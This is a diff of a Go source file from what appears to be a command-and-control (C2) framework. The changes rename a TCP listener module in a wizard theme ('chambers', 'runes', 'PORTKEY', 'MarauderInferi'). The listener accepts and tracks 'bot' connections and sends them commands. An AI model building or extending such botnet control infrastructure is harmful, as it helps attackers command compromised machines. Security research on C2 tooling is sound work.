@@ -1,4 +1,4 @@
-package modules
+package chambers
 
 import (
 	// Built-in imports
@@ -13,7 +13,7 @@ import (
 	"github.com/Yyax13/onTop-C2/src/types"
 )
 
-type ListenerSession struct {
+type MarauderInferi struct {
 	ID 			string
 	BotIP		string
 	Connection  net.Conn
@@ -22,13 +22,13 @@ type ListenerSession struct {
 
 }
 
-var Sessions = make(map[string]*ListenerSession)
+var Inferis = make(map[string]*MarauderInferi)
 func ipHandler(ip string, channel chan net.Conn) {
 	misc.SysLog(fmt.Sprintf("Starting new handler for %v", ip), true)
 	for conn := range channel {
 		misc.SysLog(fmt.Sprintf("New connection from IP %v", ip), true)
-		newSession := &ListenerSession{
-			ID: fmt.Sprintf("bot-%d", rand.Intn(90000) + 10000),
+		newSession := &MarauderInferi{
+			ID: fmt.Sprintf("inferi-%d", rand.Intn(90000) + 10000),
 			BotIP: ip,
 			Connection: conn,
 			Commands: make(chan string),
@@ -36,8 +36,8 @@ func ipHandler(ip string, channel chan net.Conn) {
 
 		}
 		
-		Sessions[newSession.ID] = newSession
-		misc.SysLog(fmt.Sprint("Session ID: ", newSession.ID, "\r\n"), true)
+		Inferis[newSession.ID] = newSession
+		misc.SysLog(fmt.Sprint("INFERI ID: ", newSession.ID, "\r\n"), true)
 
 		go sessionHandler(newSession)
 
@@ -45,7 +45,7 @@ func ipHandler(ip string, channel chan net.Conn) {
 
 }
 
-func sessionHandler(sess *ListenerSession) {
+func sessionHandler(sess *MarauderInferi) {
 	reader := bufio.NewReader(sess.Connection)
 	writer := bufio.NewWriter(sess.Connection)
 	
@@ -53,7 +53,7 @@ func sessionHandler(sess *ListenerSession) {
 		for {
 			line, err := reader.ReadString('\n')
 			if err != nil {
-				misc.PanicWarn(fmt.Sprintf("Some error ocurred in session handler: %v", err), true)
+				misc.PanicWarn(fmt.Sprintf("Some error ocurred in %s handler: %v", sess.ID, err), true)
 				break
 
 			}
@@ -78,9 +78,9 @@ func sessionHandler(sess *ListenerSession) {
 
 }
 
-var ListenerOptions map[string]*types.Option = map[string]*types.Option{
-	"PORT": {
-		Name: "PORT",
+var ListenerOptions map[string]*types.Rune = map[string]*types.Rune{
+	"PORTKEY": {
+		Name: "PORTKEY",
 		Description: "The port to listen",
 		Required: true,
 		Value: nil,
@@ -89,51 +89,51 @@ var ListenerOptions map[string]*types.Option = map[string]*types.Option{
 
 }
 
-var listener types.Module = types.Module{
-	Name: "listener",
-	Description: "Listen to TCP connections in the port, specified in options",
+var marauder types.Chamber = types.Chamber{
+	Name: "marauder",
+	Description: "Listen to TCP connections in the portkey, specified in runes",
 	Parallel: true,
-	Options: ListenerOptions,
+	Runes: ListenerOptions,
 	Execute: StartListener,
 
 }
 
-func StartListener(opt map[string]*types.Option) {
-	portOption, ok := opt["PORT"]
+func StartListener(opt map[string]*types.Rune) {
+	portOption, ok := opt["PORTKEY"]
 	if !ok {
-		misc.PanicWarn("The 'port' option is unset", true)
+		misc.PanicWarn("The 'PORTKEY' rune is unset", true)
 		return
 
 	}
 
 	port, err := misc.AnyToInt(portOption.Value)
 	if err != nil {
-		misc.PanicWarn("The 'port' option value isn't a number\n", true)
+		misc.PanicWarn("The 'PORTKEY' rune value isn't a number\n", true)
 		return
 
 	}
 
 	if !(port > 1024 && port < 65535) {
-		misc.PanicWarn("The 'port' option value isn't valid, it must be between 1024 and 65535\n", true)
+		misc.PanicWarn("The 'PORTKEY' rune value isn't valid, it must be between 1024 and 65535\n", true)
 		return
 
 	}
 
-	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
+	marauder, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
 	if err != nil {
 		misc.PanicWarn(fmt.Sprintf("Some error ocurred: %v", err.Error()), true)
-		listener.Close()
+		marauder.Close()
 
 	}
 
-	defer listener.Close()
-	misc.SysLog(fmt.Sprintf("Listening in the port %d...\n", port), true)
+	defer marauder.Close()
+	misc.SysLog(fmt.Sprintf("Listening in the portkey %d...\n", port), true)
 
 	ipClientChannel := make(map[string]chan net.Conn)
 	var mu sync.Mutex
 
 	for {
-		conn, err := listener.Accept()
+		conn, err := marauder.Accept()
 		if err != nil {
 			misc.PanicWarn(fmt.Sprintln("Some error ocurred during connection:", err), true)
 			continue
@@ -159,6 +159,6 @@ func StartListener(opt map[string]*types.Option) {
 }
 
 func init() {
-	RegisterNewModule(&listener)
+	RegisterNewModule(&marauder)
 
 }
